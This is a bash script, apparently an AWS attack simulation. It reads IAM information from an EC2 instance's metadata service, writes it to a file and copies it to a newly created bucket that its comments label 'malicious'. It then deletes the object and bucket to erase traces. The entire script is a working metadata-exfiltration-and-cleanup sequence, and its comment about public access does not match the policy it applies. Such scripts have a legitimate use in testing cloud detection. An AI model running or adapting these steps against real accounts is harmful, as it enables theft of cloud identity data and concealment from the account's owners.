#! /bin/bash

# install jq
yum install jq -y

ACCOUNT_ID=$(aws sts get-caller-identity | jq -r '.Account')
BUCKET_NAME="attack-simulation-2023"

POLICY=$(cat <<EOL
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Sid": "AllowReadAccess",
            "Effect": "Allow",
            "Principal": {"AWS": "arn:aws:iam::$ACCOUNT_ID:root"},
            "Action": "s3:GetObject",
            "Resource": "arn:aws:s3:::$BUCKET_NAME/*"
        }
    ]
}
EOL
)


# retrieve metadata from instance via container
TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"` && curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/info > credentials-info.json

# create malicious bucket
aws s3 mb s3://$BUCKET_NAME

# change bucket policy
aws s3api put-bucket-policy --bucket "$BUCKET_NAME" --policy "$POLICY"

# send data to s3 bucket with public access enabled
aws s3 cp ./credentials-info.json s3://$BUCKET_NAME

# remove bucket after data leak
aws s3 rm s3://$BUCKET_NAME/credentials-info.json
aws s3 rb s3://$BUCKET_NAME